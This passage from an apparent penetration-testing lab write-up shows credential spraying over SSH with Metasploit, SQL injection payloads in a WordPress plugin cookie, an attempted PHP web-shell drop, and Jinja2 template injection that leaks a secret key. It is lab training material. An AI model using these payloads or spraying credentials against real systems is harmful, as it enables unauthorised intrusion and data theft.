&lt;p&gt;This webserver contains an unknown binary, a jar file, and a file called token with no extension. The token file is a ASCII text that contains the token for repository.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/17.jpg&quot; alt=&quot;alt text&quot; title=&quot;repository2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;users-token&quot;&gt;Users Token&lt;/h3&gt;

&lt;p&gt;Scanning the “192.168.0.0/24” range shows numerous SSH services being availiable externally. A quick Nmap scan can be done to rediscover these results.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/pentestit# nmap -sS -n -vvv 192.168.0.0/24 -Pn -p 21,22,80,139,443,445,8080,3389 --open

Nmap scan report for 192.168.0.10
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.15
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.30
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.100
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.205
22/tcp open  ssh     syn-ack ttl 62

Nmap scan report for 192.168.0.240
22/tcp open  ssh     syn-ack ttl 62
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The credentials previously recovered for “sviridov” and “admin” user can be sprayed across these services using Crackmapexec or Metasploit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# msfconsole -nq
[-] ***
[-] * WARNING: Database support has been disabled
[-] ***
msf5 &amp;gt; use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set USERNAME sviridov@test.lab
USERNAME =&amp;gt; sviridov@test.lab
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set PASSWORD 5BEiBBtrNq695A!6u5zUR5KxC
PASSWORD =&amp;gt; 5BEiBBtrNq695A!6u5zUR5KxC
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set RHOSTS file:/root/sshhosts.txt
RHOSTS =&amp;gt; file:/root/sshhosts.txt
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting            Required  Description
   ----              ---------------            --------  -----------
   BLANK_PASSWORDS   false                      no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                          yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                      no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                      no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                      no        Add all users in the current database to the list
   PASSWORD          5BEiBBtrNq695A!6u5zUR5KxC  no        A specific password to authenticate with
   PASS_FILE                                    no        File containing passwords, one per line
   RHOSTS            file:/root/sshhosts.txt    yes       The target address range or CIDR identifier
   RPORT             22                         yes       The target port
   STOP_ON_SUCCESS   false                      yes       Stop guessing when a credential works for a host
   THREADS           1                          yes       The number of concurrent threads
   USERNAME          sviridov@test.lab          no        A specific username to authenticate as
   USERPASS_FILE                                no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                      no        Try the username as the password for all users
   USER_FILE                                    no        File containing usernames, one per line
   VERBOSE           false                      yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; run

[+] 192.168.0.10:22 - Success: 'sviridov@test.lab:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux info 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 1 opened (10.12.0.10:40079 -&amp;gt; 192.168.0.10:22) at 2019-05-06 06:17:03 -0400
[*] Scanned 1 of 6 hosts (16% complete)
[*] Scanned 2 of 6 hosts (33% complete)
[*] Scanned 3 of 6 hosts (50% complete)
[*] Scanned 4 of 6 hosts (66% complete)
[*] Scanned 5 of 6 hosts (83% complete)
[*] Scanned 6 of 6 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set USERNAME sviridov
USERNAME =&amp;gt; sviridov
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; run

[+] 192.168.0.10:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux info 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 2 opened (10.12.0.10:44971 -&amp;gt; 192.168.0.10:22) at 2019-05-06 06:18:57 -0400
[*] Scanned 1 of 6 hosts (16% complete)
[+] 192.168.0.15:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux sidorov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 3 opened (10.12.0.10:42259 -&amp;gt; 192.168.0.15:22) at 2019-05-06 06:19:00 -0400
[*] Scanned 2 of 6 hosts (33% complete)
[+] 192.168.0.30:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux petrov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 4 opened (10.12.0.10:34513 -&amp;gt; 192.168.0.30:22) at 2019-05-06 06:19:03 -0400
[*] Scanned 3 of 6 hosts (50% complete)
[+] 192.168.0.100:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux lomonosov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 5 opened (10.12.0.10:32987 -&amp;gt; 192.168.0.100:22) at 2019-05-06 06:19:06 -0400
[*] Scanned 4 of 6 hosts (66% complete)
[*] Scanned 5 of 6 hosts (83% complete)
[+] 192.168.0.240:22 - Success: 'sviridov:5BEiBBtrNq695A!6u5zUR5KxC' 'uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users) Linux sviridov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux '
[*] Command shell session 6 opened (10.12.0.10:42965 -&amp;gt; 192.168.0.240:22) at 2019-05-06 06:19:11 -0400
[*] Scanned 6 of 6 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The sviridov user credentials can be used to login to multiple servers. Searching the servers gives you information regarding other users of network  info,lomonosov,petrov,sidorov and sviridov.&lt;/p&gt;

&lt;p&gt;On the 192.168.0.100 server, access to the sidorov user’s home directory was possible and this directory cotained the Users token.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# ssh sviridov@192.168.0.100
sviridov@192.168.0.100's password:  
Warning: Your password will expire in 852 days on Sat Sep  4 18:48:18 2021
Linux lomonosov 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
Last login: Mon May  6 13:18:41 2019 from 10.12.0.10
##########################
PasswordAuthentication yes
##########################
sviridov@lomonosov:~$ ls -la
total 8
dr-x------ 2 sviridov root 4096 Dec 13 20:21 .
drwxr-xr-x 7 root     root 4096 Dec 13 20:21 ..
sviridov@lomonosov:~$ cd ../
sviridov@lomonosov:/home/TEST$ ls
info  lomonosov  petrov  sidorov  sviridov
sviridov@lomonosov:/home/TEST$ cd sidorov/
sviridov@lomonosov:/home/TEST/sidorov$ ls -la
total 12
dr-x---r-x 2 sidorov  root 4096 Dec 13 20:42 .
drwxr-xr-x 7 root     root 4096 Dec 13 20:21 ..
-r-x------ 1 sviridov root   23 Dec 13 20:40 .token
sviridov@lomonosov:/home/TEST/sidorov$ cat .token 
FGui83OIHFG80tuy38rfny
sviridov@lomonosov:/home/TEST/sidorov$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;site-token&quot;&gt;Site Token&lt;/h3&gt;

&lt;p&gt;Previous enumeration of the DNS server successfully identified the IP address of the site application to be 172.16.0.10. This application hosted a WordPress CMS system that was identified during the beginnning this network. However, exploitation of this application was not possible due to a web application firewall in place. However, if you browse the application IP address directly after VPNing as the Sidorov user to the 172.16.0.0/16 subnet, the WAF can be bypassed. An Nmap scan of the 172.16.0.0/16 range identified a HTTP service running on port 80 on the IP address 172.16.0.14. It can be assumed that this is the direct IP address of the WordPress system.&lt;/p&gt;

&lt;p&gt;WPScan can be run again to identify outdated plugins and themes: &lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url http://site.test.lab --random-user-agent&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Looking through the scan results, the following result could be intersting.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] wp-survey-and-poll
 | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/
 | Last Updated: 2019-01-17T15:32:00.000Z
 | [!] The version is out of date, the latest version is 1.5.8.1
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.7.8 (50% confidence)
 | Detected By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Previous exploitation of this plugin using the SQL Injection exploit found from exploit-db (https://www.exploit-db.com/exploits/45411) was not possible. Retest of this vulnerability resulted in successful exploitation.&lt;/p&gt;

&lt;p&gt;By modifying the ‘wp_sap’ cookie set by the plugin, it can be modified to a SQL Injection payload as specified by the exploit-db information. An example of this can be seen below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Cookie: wp_sap=[&quot;1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11 #&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;When injected, the @@version function will return information regarding the underlying database software.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/18.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;database()&lt;/code&gt; function can be used to find the current database that the application is interacting with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/19.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By querying the information_schema database, a list of all tables avaiable on the MySQL can be identified.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Cookie: wp_sap=[&quot;1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,table_name,11 from information_schema.tables #&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; var sss_params = {&quot;survey_options&quot;:&quot;{\&quot;options\&quot;:\&quot;[\\\&quot;bottom\\\&quot;,\\\&quot;easeInOutBack\\\&quot;,\\\&quot;\\\&quot;,\\\&quot;linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -o-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -ms-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -moz-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -webkit-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%);\\\&quot;,\\\&quot;rgb(81, 81, 81)\\\&quot;,\\\&quot;rgb(188, 188, 188)\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;5\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,1000,\\\&quot;So, mr. Hacker, the die is cast.\\\&quot;,\\\&quot;0\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;0\\\&quot;]\&quot;,\&quot;plugin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\&quot;,\&quot;admin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-admin\\\/admin-ajax.php\&quot;,\&quot;survey_id\&quot;:\&quot;242178939\&quot;,\&quot;style\&quot;:\&quot;modal\&quot;,\&quot;expired\&quot;:\&quot;false\&quot;,\&quot;debug\&quot;:\&quot;true\&quot;,\&quot;questions\&quot;:[[\&quot;Ready to show who is mr. Hacker?\&quot;,\&quot;Yes\&quot;,\&quot;No\&quot;],[\&quot;ALL_PLUGINS\&quot;],[\&quot;APPLICABLE_ROLES\&quot;],[\&quot;CHARACTER_SETS\&quot;],[\&quot;COLLATIONS\&quot;],[\&quot;COLLATION_CHARACTER_SET_APPLICABILITY\&quot;],[\&quot;COLUMNS\&quot;],[\&quot;COLUMN_PRIVILEGES\&quot;],[\&quot;ENABLED_ROLES\&quot;],[\&quot;ENGINES\&quot;],[\&quot;EVENTS\&quot;],[\&quot;FILES\&quot;],[\&quot;GLOBAL_STATUS\&quot;],[\&quot;GLOBAL_VARIABLES\&quot;],[\&quot;KEY_CACHES\&quot;],[\&quot;KEY_COLUMN_USAGE\&quot;],[\&quot;PARAMETERS\&quot;],[\&quot;PARTITIONS\&quot;],[\&quot;PLUGINS\&quot;],[\&quot;PROCESSLIST\&quot;],[\&quot;PROFILING\&quot;],[\&quot;REFERENTIAL_CONSTRAINTS\&quot;],[\&quot;ROUTINES\&quot;],[\&quot;SCHEMATA\&quot;],[\&quot;SCHEMA_PRIVILEGES\&quot;],[\&quot;SESSION_STATUS\&quot;],[\&quot;SESSION_VARIABLES\&quot;],[\&quot;STATISTICS\&quot;],[\&quot;SYSTEM_VARIABLES\&quot;],[\&quot;TABLES\&quot;],[\&quot;TABLESPACES\&quot;],[\&quot;TABLE_CONSTRAINTS\&quot;],[\&quot;TABLE_PRIVILEGES\&quot;],[\&quot;TRIGGERS\&quot;],[\&quot;USER_PRIVILEGES\&quot;],[\&quot;VIEWS\&quot;],[\&quot;GEOMETRY_COLUMNS\&quot;],[\&quot;SPATIAL_REF_SYS\&quot;],[\&quot;CLIENT_STATISTICS\&quot;],[\&quot;INDEX_STATISTICS\&quot;],[\&quot;INNODB_SYS_DATAFILES\&quot;],[\&quot;TABLE_STATISTICS\&quot;],[\&quot;INNODB_SYS_TABLESTATS\&quot;],[\&quot;USER_STATISTICS\&quot;],[\&quot;INNODB_SYS_INDEXES\&quot;],[\&quot;XTRADB_RSEG\&quot;],[\&quot;INNODB_CMP_PER_INDEX\&quot;],[\&quot;INNODB_TRX\&quot;],[\&quot;CHANGED_PAGE_BITMAPS\&quot;],[\&quot;INNODB_FT_BEING_DELETED\&quot;],[\&quot;INNODB_LOCK_WAITS\&quot;],[\&quot;INNODB_LOCKS\&quot;],[\&quot;INNODB_TABLESPACES_ENCRYPTION\&quot;],[\&quot;XTRADB_INTERNAL_HASH_TABLES\&quot;],[\&quot;INNODB_SYS_FIELDS\&quot;],[\&quot;INNODB_CMPMEM_RESET\&quot;],[\&quot;INNODB_CMP\&quot;],[\&quot;INNODB_FT_INDEX_TABLE\&quot;],[\&quot;INNODB_SYS_TABLESPACES\&quot;],[\&quot;INNODB_MUTEXES\&quot;],[\&quot;INNODB_BUFFER_PAGE_LRU\&quot;],[\&quot;INNODB_SYS_FOREIGN_COLS\&quot;],[\&quot;INNODB_CMP_RESET\&quot;],[\&quot;INNODB_BUFFER_POOL_STATS\&quot;],[\&quot;INNODB_FT_INDEX_CACHE\&quot;],[\&quot;INNODB_SYS_FOREIGN\&quot;],[\&quot;INNODB_METRICS\&quot;],[\&quot;INNODB_FT_DEFAULT_STOPWORD\&quot;],[\&quot;INNODB_CMPMEM\&quot;],[\&quot;INNODB_SYS_TABLES\&quot;],[\&quot;INNODB_SYS_COLUMNS\&quot;],[\&quot;INNODB_FT_CONFIG\&quot;],[\&quot;INNODB_BUFFER_PAGE\&quot;],[\&quot;INNODB_CMP_PER_INDEX_RESET\&quot;],[\&quot;XTRADB_READ_VIEW\&quot;],[\&quot;INNODB_SYS_SEMAPHORE_WAITS\&quot;],[\&quot;INNODB_CHANGED_PAGES\&quot;],[\&quot;INNODB_FT_DELETED\&quot;],[\&quot;INNODB_TABLESPACES_SCRUBBING\&quot;],[\&quot;token\&quot;],[\&quot;wp_commentmeta\&quot;],[\&quot;wp_comments\&quot;],[\&quot;wp_links\&quot;],[\&quot;wp_options\&quot;],[\&quot;wp_postmeta\&quot;],[\&quot;wp_posts\&quot;],[\&quot;wp_term_relationships\&quot;],[\&quot;wp_term_taxonomy\&quot;],[\&quot;wp_termmeta\&quot;],[\&quot;wp_terms\&quot;],[\&quot;wp_usermeta\&quot;],[\&quot;wp_users\&quot;],[\&quot;wp_wp_sap_answers\&quot;],[\&quot;wp_wp_sap_questions\&quot;],[\&quot;wp_wp_sap_surveys\&quot;]]}&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;By looking at the above output, the table “token” stands out. Any columns belonging to this table can be identified using the below SQL Injection payload.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Cookie: wp_sap=[&quot;1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,column_name,11 from information_schema.columns where table_name = 'token'#&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This gives us information regarding a column called “name” existing within the “token” table.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  var sss_params = {&quot;survey_options&quot;:&quot;{\&quot;options\&quot;:\&quot;[\\\&quot;bottom\\\&quot;,\\\&quot;easeInOutBack\\\&quot;,\\\&quot;\\\&quot;,\\\&quot;linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -o-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -ms-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -moz-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -webkit-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%);\\\&quot;,\\\&quot;rgb(81, 81, 81)\\\&quot;,\\\&quot;rgb(188, 188, 188)\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;5\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,1000,\\\&quot;So, mr. Hacker, the die is cast.\\\&quot;,\\\&quot;0\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;0\\\&quot;]\&quot;,\&quot;plugin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\&quot;,\&quot;admin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-admin\\\/admin-ajax.php\&quot;,\&quot;survey_id\&quot;:\&quot;242178939\&quot;,\&quot;style\&quot;:\&quot;modal\&quot;,\&quot;expired\&quot;:\&quot;false\&quot;,\&quot;debug\&quot;:\&quot;true\&quot;,\&quot;questions\&quot;:[[\&quot;Ready to show who is mr. Hacker?\&quot;,\&quot;Yes\&quot;,\&quot;No\&quot;],[\&quot;name\&quot;]]}&quot;};
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This column can now be queried directly to find the Site token.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/21.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Other payloads such as &lt;code class=&quot;highlighter-rouge&quot;&gt;UNION ALL SELECT 1,&amp;lt;?php echo shell_exec($_GET['cmd'])?&amp;gt;,3,4,5,6,7,8,9,10,11 into OUTFILE  '/var/www/shell.php' #&lt;/code&gt; was tried to possibly execute code on the system through SQL Injection. But, this was found to be not possible.&lt;/p&gt;

&lt;h3 id=&quot;my-token&quot;&gt;My Token&lt;/h3&gt;

&lt;p&gt;Looking at the previously obtained DNS names from the DNS token, the following IP address corresponds to my.test.lab.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;my.test.lab.		21600	IN	A	172.16.0.10
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A quick nmap reveals a web server to be present on port 80.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -sS -n 172.16.0.10
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-09 18:14 EDT
Nmap scan report for 172.16.0.10
Host is up (0.060s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
root@kali:~/Downloads# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Visiting the webserver using a web browser shows the following login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/22.jpg&quot; alt=&quot;alt text&quot; title=&quot;my1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It was possible to login to this web application using the previously found ‘info’ user credentials with the password ‘123456789’.&lt;/p&gt;

&lt;p&gt;After examining the page, it looks like the application is vulnerable to Server Side Template Injection (SSTI). Server Side Template Injection is possible when an attacker can inject template directive as user input that can execute arbitrary code on the server. Some popular and widely used template engines are Smarty, Twig, Jinja2, FreeMarker, Velocity. More information regarding this vulnerability can be found here: https://portswigger.net/blog/server-side-template-injection&lt;/p&gt;

&lt;p&gt;Presence of this vulnerability can be successfully identified by inserting a payload such as ‘{{11*2}}’ which evaluates to 22.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/23.jpg&quot; alt=&quot;alt text&quot; title=&quot;my2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The tool tplmap was used to quickly exploit this vulnerability however that was found to be not possible.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/tplmap# ./tplmap.py -u 'http://my.test.lab/?q=kk'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'q' is injectable
[+] Smarty plugin is testing rendering with tag *
[+] Smarty plugin is testing blind injection
[+] Dot plugin is testing blind injection
[+] Dust plugin is testing rendering
[+] Dust plugin is testing blind injection
[+] Marko plugin is testing rendering with tag 
[+] Marko plugin is testing blind injection
[+] Javascript plugin is testing rendering with tag '*'
[+] Javascript plugin is testing blind injection
[+] Php plugin is testing rendering with tag 
[+] Php plugin is testing blind injection
[+] Ruby plugin is testing rendering with tag 
[+] Ruby plugin is testing blind injection
[+] Ejs plugin is testing rendering with tag '*'
[+] Ejs plugin is testing blind injection
[!][checks] Tested parameters appear to be not injectable
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After looking through tplmap’s source code and by reading through the great methodology given by James Kettle of Portswigger (https://portswigger.net/blog/server-side-template-injection), the following can be done to identify what template is in use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png&quot; alt=&quot;alt text&quot; title=&quot;my3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By following the above methodology, it is possible to identify that the template in use in Jinja2 since it evaluates ‘{{7*‘7’}}’ to 7777777.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/24.jpg&quot; alt=&quot;alt text&quot; title=&quot;my2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Knowing that, enumeration of the application can now begin. The following global variables are available within Jinja2 templates by default:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;config&lt;/code&gt; - the current configuration object&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;request&lt;/code&gt; - the current request object&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; - the current session object&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt; - the request-bound object for global variables. This is usually used by the developer to store resources during a request.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The configuration object can be called to retrieve the secret key used by the Jinja template. The Secret Key ‘UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==’ is the My token.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/25.jpg&quot; alt=&quot;alt text&quot; title=&quot;my4&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reverse-token&quot;&gt;Reverse Token&lt;/h3&gt;

&lt;p&gt;Examining the file downloaded from &lt;code class=&quot;highlighter-rouge&quot;&gt;repository.test.lab&lt;/code&gt;, it looks to be an executable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# file bin
bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=119ea32cf92d114f4c938989562717e2451414d9, not stripped
root@kali:~/Downloads# strings bin
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
printf
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.7
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
PASSWORD: 
%32s
ACCESS GRANTED!
ACCESS DENIED!
;*3$&quot;
qk0Q5ZmS3au5RkcPuyotTjtg3G0bux3r
Qn8AiYpfA4rPUrL9Oxn1ET5vG8h7o7xb
a1aX9SLLbe3Fksvqtv7YhRoqtaw91ezu
nFb4dqPjHNnUoGJhC9u7gBdb9YWyCBxL
HNnwB0GQNeVL5CGzMWjpuKfxDfqVPb1K
3Z95TWpP8AjUCROxVRWwdciYZeALUOdX
s9ZYhZfC1QJ648ks4T2osoLzdFizYgTN
iAp6GHesRyGqYFR2nrI6eVsRBCg8wwuC
kheitdX7MaAJUmiUcCKyRY8S3OCL6EYU
ZGu3qyV3h0SjtvcXydEFkDAY614ag0Wz
Qm0WDrht1fHYMCwNJMX7JzyJZgs4uT44
fMbNVxtoCJPmqaioEFrCNCAqUJJey5t5
9gnkzkuM7bp3nYaqneAL5PErwSZoDdHR
pDCZ4rifJzZbXC3JCcdG8VXm4sb2dUHg
cmHunusgo6mLm1k2mECv4twf9NFotmh0
SH09vwZGljB1gBuxiEEWBVAyoEtMMfwH
AWBbrLGVxIxW3SwxdLzGaJtwnTPkS0CI
BEE08jI0dF1WwDZZjTMS3wnR8gn1Yl0P
2wI2d3MAhcASlc7Jh3glOlRzHsCP6aYG
PRkuaCnSV6PvKZR69c6ZdZmmSXcJhXaI
fV3Z3hTeDSkDcB3tA6ErgkfACczshjOk
RG2UK0t01h6Iu1mYoYNMwaDYOFLDdKbb
h5RsV2d5xxvva4hNQCKAeImgyYv2VGsn
U2UBCWM6LMfjTrPViCvE2iCoy2HFGlZu
1E0kpCL4HsvT08R7MS1b7QOHmGjPRjej
5rHeHjWfheNpO6fOcRKo8UaBIYy5Elmm
9hNjolVactGp6W2ANee4x3TqQbhomXDC
jxV1ieQfSW7jJBcBCNeEDy0tN0WKUzkX
ZQ6jg2CvZYAIr5jJUqoPBoKmgKEvbc2J
bPnjBvCFSJOWjZQ4YTt8yl9Qg2iZ4BjC
gamRgM6VyyM9UyvaigVutUkAo9xWcUmb
zAICHvw3womkL80wKKeJG5nbkQR0ziw7
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
crme.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
check_pw
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
